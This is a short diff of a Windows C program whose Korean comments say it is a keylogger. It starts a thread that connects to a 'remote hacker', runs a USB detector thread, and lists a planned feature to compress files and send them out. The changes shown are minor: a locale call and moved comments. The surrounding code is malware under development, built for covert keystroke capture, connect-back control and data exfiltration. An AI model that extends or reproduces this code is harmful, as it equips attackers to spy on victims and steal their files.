@@ -58,9 +58,10 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance//int main역할�
 		MessageBox(hWnd, TEXT("WSAStartUp Failed"), TEXT("Error"), MB_OK);
 
 	hWndMain = hWnd;
-	//소켓생성
-	ReadAddr();
-	CreateSocket();
+	
+	setlocale(LC_ALL, "Korean");
+	ReadAddr();//주소파일 읽어옴
+	CreateSocket();//소켓생성
 	//원격해커에게 접속시도할 쓰레드 생성 ,USB 디텍터 스레드 실행
 	Con_pThread = (HANDLE)_beginthreadex(NULL, 0, ConnectProc, NULL, 0, 0);
 	USB_pThread = (HANDLE)_beginthreadex(NULL, 0, USBDetector, NULL, 0, 0);
@@ -136,4 +137,3 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM IParam)
 
 //키로거 강제종료시 종료코드전달안됨
 //파일앞축후 전송기능 추가
-//ReadAddr 에러 _tcstok에러
